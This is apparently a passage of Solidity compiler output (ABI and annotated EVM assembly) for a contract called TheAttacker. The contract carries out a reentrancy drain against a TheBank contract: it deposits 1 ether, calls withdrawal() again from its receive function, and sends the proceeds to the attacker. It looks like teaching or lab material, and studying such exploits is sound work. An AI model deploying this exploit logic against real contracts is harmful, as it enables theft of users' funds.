{
	"theBank.sol": {
		"TheAttacker": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_thebankAddress",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attacker",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getBalances",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "theBank",
					"outputs": [
						{
							"internalType": "contract TheBank",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "totalBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdrawToAttacker",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"theBank.sol\":1023:2201  contract TheAttacker {\r... */\n  mstore(0x40, 0x80)\n    /* \"theBank.sol\":1114:1285  constructor(address _thebankAddress) {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"theBank.sol\":1180:1195  _thebankAddress */\n  dup1\n    /* \"theBank.sol\":1162:1169  theBank */\n  0x00\n  dup1\n    /* \"theBank.sol\":1162:1196  theBank = TheBank(_thebankAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"theBank.sol\":1218:1228  msg.sender */\n  caller\n    /* \"theBank.sol\":1207:1215  attacker */\n  0x01\n  0x00\n    /* \"theBank.sol\":1207:1228  attacker = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"theBank.sol\":1114:1285  constructor(address _thebankAddress) {\r... */\n  pop\n    /* \"theBank.sol\":1023:2201  contract TheAttacker {\r... */\n  jump(tag_6)\n    /* \"#utility.yul\":7:150   */\ntag_8:\n  0x00\n    /* \"#utility.yul\":95:101   */\n  dup2\n    /* \"#utility.yul\":89:102   */\n  mload\n    /* \"#utility.yul\":80:102   */\n  swap1\n  pop\n    /* \"#utility.yul\":111:144   */\n  tag_10\n    /* \"#utility.yul\":138:143   */\n  dup2\n    /* \"#utility.yul\":111:144   */\n  tag_11\n  jump\t// in\ntag_10:\n    /* \"#utility.yul\":70:150   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":156:440   */\ntag_3:\n  0x00\n    /* \"#utility.yul\":275:277   */\n  0x20\n    /* \"#utility.yul\":263:272   */\n  dup3\n    /* \"#utility.yul\":254:261   */\n  dup5\n    /* \"#utility.yul\":250:273   */\n  sub\n    /* \"#utility.yul\":246:278   */\n  slt\n    /* \"#utility.yul\":243:245   */\n  iszero\n  tag_13\n  jumpi\n    /* \"#utility.yul\":291:292   */\n  0x00\n    /* \"#utility.yul\":288:289   */\n  dup1\n    /* \"#utility.yul\":281:293   */\n  revert\n    /* \"#utility.yul\":243:245   */\ntag_13:\n    /* \"#utility.yul\":334:335   */\n  0x00\n    /* \"#utility.yul\":359:423   */\n  tag_14\n    /* \"#utility.yul\":415:422   */\n  dup5\n    /* \"#utility.yul\":406:412   */\n  dup3\n    /* \"#utility.yul\":395:404   */\n  dup6\n    /* \"#utility.yul\":391:413   */\n  add\n    /* \"#utility.yul\":359:423   */\n  tag_8\n  jump\t// in\ntag_14:\n    /* \"#utility.yul\":349:423   */\n  swap2\n  pop\n    /* \"#utility.yul\":305:433   */\n  pop\n    /* \"#utility.yul\":233:440   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":446:542   */\ntag_15:\n  0x00\n    /* \"#utility.yul\":512:536   */\n  tag_17\n    /* \"#utility.yul\":530:535   */\n  dup3\n    /* \"#utility.yul\":512:536   */\n  tag_18\n  jump\t// in\ntag_17:\n    /* \"#utility.yul\":501:536   */\n  swap1\n  pop\n    /* \"#utility.yul\":491:542   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":548:674   */\ntag_18:\n  0x00\n    /* \"#utility.yul\":625:667   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":618:623   */\n  dup3\n    /* \"#utility.yul\":614:668   */\n  and\n    /* \"#utility.yul\":603:668   */\n  swap1\n  pop\n    /* \"#utility.yul\":593:674   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":680:802   */\ntag_11:\n    /* \"#utility.yul\":753:777   */\n  tag_21\n    /* \"#utility.yul\":771:776   */\n  dup2\n    /* \"#utility.yul\":753:777   */\n  tag_15\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":746:751   */\n  dup2\n    /* \"#utility.yul\":743:778   */\n  eq\n    /* \"#utility.yul\":733:735   */\n  tag_22\n  jumpi\n    /* \"#utility.yul\":792:793   */\n  0x00\n    /* \"#utility.yul\":789:790   */\n  dup1\n    /* \"#utility.yul\":782:794   */\n  revert\n    /* \"#utility.yul\":733:735   */\ntag_22:\n    /* \"#utility.yul\":723:802   */\n  pop\n  jump\t// out\n    /* \"theBank.sol\":1023:2201  contract TheAttacker {\r... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"theBank.sol\":1023:2201  contract TheAttacker {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x113e08\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x0872dc41\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x48eb76ee\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xad7a672f\n      eq\n      tag_7\n      jumpi\n      dup1\n      0xff4707ee\n      eq\n      tag_8\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"theBank.sol\":1363:1370  1 ether */\n      0x0de0b6b3a7640000\n        /* \"theBank.sol\":1343:1350  theBank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"theBank.sol\":1335:1359  address(theBank).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"theBank.sol\":1335:1370  address(theBank).balance >= 1 ether */\n      lt\n        /* \"theBank.sol\":1331:1481  if (address(theBank).balance >= 1 ether) {\r... */\n      tag_11\n      jumpi\n        /* \"theBank.sol\":1387:1394  theBank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"theBank.sol\":1387:1405  theBank.withdrawal */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd4e93292\n        /* \"theBank.sol\":1387:1407  theBank.withdrawal() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_14:\n      pop\n      pop\n      pop\n      pop\n        /* \"theBank.sol\":1331:1481  if (address(theBank).balance >= 1 ether) {\r... */\n    tag_11:\n        /* \"theBank.sol\":1023:2201  contract TheAttacker {\r... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"theBank.sol\":1995:2092  function getBalances() public view returns (uint) {\r... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_15\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_15:\n      pop\n      tag_16\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      tag_18\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"theBank.sol\":1053:1075  TheBank public theBank */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_20\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_20:\n      pop\n      tag_21\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      tag_23\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"theBank.sol\":1082:1105  address public attacker */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_25\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_25:\n      pop\n      tag_26\n      tag_27\n      jump\t// in\n    tag_26:\n      mload(0x40)\n      tag_28\n      swap2\n      swap1\n      tag_29\n      jump\t// in\n    tag_28:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"theBank.sol\":1496:1694  function attack() external payable {\r... */\n    tag_6:\n      tag_30\n      tag_31\n      jump\t// in\n    tag_30:\n      stop\n        /* \"theBank.sol\":2100:2198  function totalBalance() public view returns (uint) {\r... */\n    tag_7:\n      callvalue\n      dup1\n      iszero\n      tag_32\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_32:\n      pop\n      tag_33\n      tag_34\n      jump\t// in\n    tag_33:\n      mload(0x40)\n      tag_35\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_35:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"theBank.sol\":1702:1987  function withdrawToAttacker() public {\r... */\n    tag_8:\n      callvalue\n      dup1\n      iszero\n      tag_36\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_36:\n      pop\n      tag_37\n      tag_38\n      jump\t// in\n    tag_37:\n      stop\n        /* \"theBank.sol\":1995:2092  function getBalances() public view returns (uint) {\r... */\n    tag_17:\n        /* \"theBank.sol\":2039:2043  uint */\n      0x00\n        /* \"theBank.sol\":2063:2084  address(this).balance */\n      selfbalance\n        /* \"theBank.sol\":2056:2084  return address(this).balance */\n      swap1\n      pop\n        /* \"theBank.sol\":1995:2092  function getBalances() public view returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"theBank.sol\":1053:1075  TheBank public theBank */\n    tag_22:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"theBank.sol\":1082:1105  address public attacker */\n    tag_27:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"theBank.sol\":1496:1694  function attack() external payable {\r... */\n    tag_31:\n        /* \"theBank.sol\":1563:1570  1 ether */\n      0x0de0b6b3a7640000\n        /* \"theBank.sol\":1550:1559  msg.value */\n      callvalue\n        /* \"theBank.sol\":1550:1570  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"theBank.sol\":1542:1611  require(msg.value >= 1 ether, \"must send at least 1 ether to attack\") */\n      tag_41\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_42\n      swap1\n      tag_43\n      jump\t// in\n    tag_42:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_41:\n        /* \"theBank.sol\":1622:1629  theBank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"theBank.sol\":1622:1637  theBank.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"theBank.sol\":1645:1652  1 ether */\n      0x0de0b6b3a7640000\n        /* \"theBank.sol\":1622:1655  theBank.deposit{value: 1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_44\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_44:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_46\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_46:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"theBank.sol\":1666:1673  theBank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"theBank.sol\":1666:1684  theBank.withdrawal */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd4e93292\n        /* \"theBank.sol\":1666:1686  theBank.withdrawal() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_47\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_47:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_49\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_49:\n      pop\n      pop\n      pop\n      pop\n        /* \"theBank.sol\":1496:1694  function attack() external payable {\r... */\n      jump\t// out\n        /* \"theBank.sol\":2100:2198  function totalBalance() public view returns (uint) {\r... */\n    tag_34:\n        /* \"theBank.sol\":2145:2149  uint */\n      0x00\n        /* \"theBank.sol\":2169:2190  address(this).balance */\n      selfbalance\n        /* \"theBank.sol\":2162:2190  return address(this).balance */\n      swap1\n      pop\n        /* \"theBank.sol\":2100:2198  function totalBalance() public view returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"theBank.sol\":1702:1987  function withdrawToAttacker() public {\r... */\n    tag_38:\n        /* \"theBank.sol\":1772:1780  attacker */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"theBank.sol\":1758:1780  msg.sender == attacker */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"theBank.sol\":1758:1768  msg.sender */\n      caller\n        /* \"theBank.sol\":1758:1780  msg.sender == attacker */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"theBank.sol\":1750:1811  require(msg.sender == attacker, \"Only attacker can withdraw\") */\n      tag_52\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_53\n      swap1\n      tag_54\n      jump\t// in\n    tag_53:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_52:\n        /* \"theBank.sol\":1822:1834  uint balance */\n      0x00\n        /* \"theBank.sol\":1837:1858  address(this).balance */\n      selfbalance\n        /* \"theBank.sol\":1822:1858  uint balance = address(this).balance */\n      swap1\n      pop\n        /* \"theBank.sol\":1870:1882  bool success */\n      0x00\n        /* \"theBank.sol\":1888:1896  attacker */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"theBank.sol\":1888:1901  attacker.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"theBank.sol\":1909:1916  balance */\n      dup3\n        /* \"theBank.sol\":1888:1921  attacker.call{value: balance}(\"\") */\n      mload(0x40)\n      tag_55\n      swap1\n      tag_56\n      jump\t// in\n    tag_55:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_59\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_58)\n    tag_59:\n      0x60\n      swap2\n      pop\n    tag_58:\n      pop\n        /* \"theBank.sol\":1869:1921  (bool success, ) = attacker.call{value: balance}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"theBank.sol\":1940:1947  success */\n      dup1\n        /* \"theBank.sol\":1932:1979  require(success, \"Withdraw to attacker failed\") */\n      tag_60\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_61\n      swap1\n      tag_62\n      jump\t// in\n    tag_61:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_60:\n        /* \"theBank.sol\":1702:1987  function withdrawToAttacker() public {\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:125   */\n    tag_64:\n        /* \"#utility.yul\":94:118   */\n      tag_66\n        /* \"#utility.yul\":112:117   */\n      dup2\n        /* \"#utility.yul\":94:118   */\n      tag_67\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":89:92   */\n      dup3\n        /* \"#utility.yul\":82:119   */\n      mstore\n        /* \"#utility.yul\":72:125   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":131:290   */\n    tag_68:\n        /* \"#utility.yul\":232:283   */\n      tag_70\n        /* \"#utility.yul\":277:282   */\n      dup2\n        /* \"#utility.yul\":232:283   */\n      tag_71\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":227:230   */\n      dup3\n        /* \"#utility.yul\":220:284   */\n      mstore\n        /* \"#utility.yul\":210:290   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":296:662   */\n    tag_72:\n      0x00\n        /* \"#utility.yul\":459:526   */\n      tag_74\n        /* \"#utility.yul\":523:525   */\n      0x1b\n        /* \"#utility.yul\":518:521   */\n      dup4\n        /* \"#utility.yul\":459:526   */\n      tag_75\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":452:526   */\n      swap2\n      pop\n        /* \"#utility.yul\":535:628   */\n      tag_76\n        /* \"#utility.yul\":624:627   */\n      dup3\n        /* \"#utility.yul\":535:628   */\n      tag_77\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":653:655   */\n      0x20\n        /* \"#utility.yul\":648:651   */\n      dup3\n        /* \"#utility.yul\":644:656   */\n      add\n        /* \"#utility.yul\":637:656   */\n      swap1\n      pop\n        /* \"#utility.yul\":442:662   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":668:1066   */\n    tag_78:\n      0x00\n        /* \"#utility.yul\":848:931   */\n      tag_80\n        /* \"#utility.yul\":929:930   */\n      0x00\n        /* \"#utility.yul\":924:927   */\n      dup4\n        /* \"#utility.yul\":848:931   */\n      tag_81\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":841:931   */\n      swap2\n      pop\n        /* \"#utility.yul\":940:1033   */\n      tag_82\n        /* \"#utility.yul\":1029:1032   */\n      dup3\n        /* \"#utility.yul\":940:1033   */\n      tag_83\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":1058:1059   */\n      0x00\n        /* \"#utility.yul\":1053:1056   */\n      dup3\n        /* \"#utility.yul\":1049:1060   */\n      add\n        /* \"#utility.yul\":1042:1060   */\n      swap1\n      pop\n        /* \"#utility.yul\":831:1066   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1072:1438   */\n    tag_84:\n      0x00\n        /* \"#utility.yul\":1235:1302   */\n      tag_86\n        /* \"#utility.yul\":1299:1301   */\n      0x1a\n        /* \"#utility.yul\":1294:1297   */\n      dup4\n        /* \"#utility.yul\":1235:1302   */\n      tag_75\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":1228:1302   */\n      swap2\n      pop\n        /* \"#utility.yul\":1311:1404   */\n      tag_87\n        /* \"#utility.yul\":1400:1403   */\n      dup3\n        /* \"#utility.yul\":1311:1404   */\n      tag_88\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":1429:1431   */\n      0x20\n        /* \"#utility.yul\":1424:1427   */\n      dup3\n        /* \"#utility.yul\":1420:1432   */\n      add\n        /* \"#utility.yul\":1413:1432   */\n      swap1\n      pop\n        /* \"#utility.yul\":1218:1438   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1444:1810   */\n    tag_89:\n      0x00\n        /* \"#utility.yul\":1607:1674   */\n      tag_91\n        /* \"#utility.yul\":1671:1673   */\n      0x24\n        /* \"#utility.yul\":1666:1669   */\n      dup4\n        /* \"#utility.yul\":1607:1674   */\n      tag_75\n      jump\t// in\n    tag_91:\n        /* \"#utility.yul\":1600:1674   */\n      swap2\n      pop\n        /* \"#utility.yul\":1683:1776   */\n      tag_92\n        /* \"#utility.yul\":1772:1775   */\n      dup3\n        /* \"#utility.yul\":1683:1776   */\n      tag_93\n      jump\t// in\n    tag_92:\n        /* \"#utility.yul\":1801:1803   */\n      0x40\n        /* \"#utility.yul\":1796:1799   */\n      dup3\n        /* \"#utility.yul\":1792:1804   */\n      add\n        /* \"#utility.yul\":1785:1804   */\n      swap1\n      pop\n        /* \"#utility.yul\":1590:1810   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1816:1934   */\n    tag_94:\n        /* \"#utility.yul\":1903:1927   */\n      tag_96\n        /* \"#utility.yul\":1921:1926   */\n      dup2\n        /* \"#utility.yul\":1903:1927   */\n      tag_97\n      jump\t// in\n    tag_96:\n        /* \"#utility.yul\":1898:1901   */\n      dup3\n        /* \"#utility.yul\":1891:1928   */\n      mstore\n        /* \"#utility.yul\":1881:1934   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1940:2319   */\n    tag_56:\n      0x00\n        /* \"#utility.yul\":2146:2293   */\n      tag_99\n        /* \"#utility.yul\":2289:2292   */\n      dup3\n        /* \"#utility.yul\":2146:2293   */\n      tag_78\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":2139:2293   */\n      swap2\n      pop\n        /* \"#utility.yul\":2310:2313   */\n      dup2\n        /* \"#utility.yul\":2303:2313   */\n      swap1\n      pop\n        /* \"#utility.yul\":2128:2319   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2325:2547   */\n    tag_29:\n      0x00\n        /* \"#utility.yul\":2456:2458   */\n      0x20\n        /* \"#utility.yul\":2445:2454   */\n      dup3\n        /* \"#utility.yul\":2441:2459   */\n      add\n        /* \"#utility.yul\":2433:2459   */\n      swap1\n      pop\n        /* \"#utility.yul\":2469:2540   */\n      tag_101\n        /* \"#utility.yul\":2537:2538   */\n      0x00\n        /* \"#utility.yul\":2526:2535   */\n      dup4\n        /* \"#utility.yul\":2522:2539   */\n      add\n        /* \"#utility.yul\":2513:2519   */\n      dup5\n        /* \"#utility.yul\":2469:2540   */\n      tag_64\n      jump\t// in\n    tag_101:\n        /* \"#utility.yul\":2423:2547   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2553:2803   */\n    tag_24:\n      0x00\n        /* \"#utility.yul\":2698:2700   */\n      0x20\n        /* \"#utility.yul\":2687:2696   */\n      dup3\n        /* \"#utility.yul\":2683:2701   */\n      add\n        /* \"#utility.yul\":2675:2701   */\n      swap1\n      pop\n        /* \"#utility.yul\":2711:2796   */\n      tag_103\n        /* \"#utility.yul\":2793:2794   */\n      0x00\n        /* \"#utility.yul\":2782:2791   */\n      dup4\n        /* \"#utility.yul\":2778:2795   */\n      add\n        /* \"#utility.yul\":2769:2775   */\n      dup5\n        /* \"#utility.yul\":2711:2796   */\n      tag_68\n      jump\t// in\n    tag_103:\n        /* \"#utility.yul\":2665:2803   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2809:3228   */\n    tag_62:\n      0x00\n        /* \"#utility.yul\":3013:3015   */\n      0x20\n        /* \"#utility.yul\":3002:3011   */\n      dup3\n        /* \"#utility.yul\":2998:3016   */\n      add\n        /* \"#utility.yul\":2990:3016   */\n      swap1\n      pop\n        /* \"#utility.yul\":3062:3071   */\n      dup2\n        /* \"#utility.yul\":3056:3060   */\n      dup2\n        /* \"#utility.yul\":3052:3072   */\n      sub\n        /* \"#utility.yul\":3048:3049   */\n      0x00\n        /* \"#utility.yul\":3037:3046   */\n      dup4\n        /* \"#utility.yul\":3033:3050   */\n      add\n        /* \"#utility.yul\":3026:3073   */\n      mstore\n        /* \"#utility.yul\":3090:3221   */\n      tag_105\n        /* \"#utility.yul\":3216:3220   */\n      dup2\n        /* \"#utility.yul\":3090:3221   */\n      tag_72\n      jump\t// in\n    tag_105:\n        /* \"#utility.yul\":3082:3221   */\n      swap1\n      pop\n        /* \"#utility.yul\":2980:3228   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3234:3653   */\n    tag_54:\n      0x00\n        /* \"#utility.yul\":3438:3440   */\n      0x20\n        /* \"#utility.yul\":3427:3436   */\n      dup3\n        /* \"#utility.yul\":3423:3441   */\n      add\n        /* \"#utility.yul\":3415:3441   */\n      swap1\n      pop\n        /* \"#utility.yul\":3487:3496   */\n      dup2\n        /* \"#utility.yul\":3481:3485   */\n      dup2\n        /* \"#utility.yul\":3477:3497   */\n      sub\n        /* \"#utility.yul\":3473:3474   */\n      0x00\n        /* \"#utility.yul\":3462:3471   */\n      dup4\n        /* \"#utility.yul\":3458:3475   */\n      add\n        /* \"#utility.yul\":3451:3498   */\n      mstore\n        /* \"#utility.yul\":3515:3646   */\n      tag_107\n        /* \"#utility.yul\":3641:3645   */\n      dup2\n        /* \"#utility.yul\":3515:3646   */\n      tag_84\n      jump\t// in\n    tag_107:\n        /* \"#utility.yul\":3507:3646   */\n      swap1\n      pop\n        /* \"#utility.yul\":3405:3653   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3659:4078   */\n    tag_43:\n      0x00\n        /* \"#utility.yul\":3863:3865   */\n      0x20\n        /* \"#utility.yul\":3852:3861   */\n      dup3\n        /* \"#utility.yul\":3848:3866   */\n      add\n        /* \"#utility.yul\":3840:3866   */\n      swap1\n      pop\n        /* \"#utility.yul\":3912:3921   */\n      dup2\n        /* \"#utility.yul\":3906:3910   */\n      dup2\n        /* \"#utility.yul\":3902:3922   */\n      sub\n        /* \"#utility.yul\":3898:3899   */\n      0x00\n        /* \"#utility.yul\":3887:3896   */\n      dup4\n        /* \"#utility.yul\":3883:3900   */\n      add\n        /* \"#utility.yul\":3876:3923   */\n      mstore\n        /* \"#utility.yul\":3940:4071   */\n      tag_109\n        /* \"#utility.yul\":4066:4070   */\n      dup2\n        /* \"#utility.yul\":3940:4071   */\n      tag_89\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":3932:4071   */\n      swap1\n      pop\n        /* \"#utility.yul\":3830:4078   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4084:4306   */\n    tag_19:\n      0x00\n        /* \"#utility.yul\":4215:4217   */\n      0x20\n        /* \"#utility.yul\":4204:4213   */\n      dup3\n        /* \"#utility.yul\":4200:4218   */\n      add\n        /* \"#utility.yul\":4192:4218   */\n      swap1\n      pop\n        /* \"#utility.yul\":4228:4299   */\n      tag_111\n        /* \"#utility.yul\":4296:4297   */\n      0x00\n        /* \"#utility.yul\":4285:4294   */\n      dup4\n        /* \"#utility.yul\":4281:4298   */\n      add\n        /* \"#utility.yul\":4272:4278   */\n      dup5\n        /* \"#utility.yul\":4228:4299   */\n      tag_94\n      jump\t// in\n    tag_111:\n        /* \"#utility.yul\":4182:4306   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4312:4459   */\n    tag_81:\n      0x00\n        /* \"#utility.yul\":4450:4453   */\n      dup2\n        /* 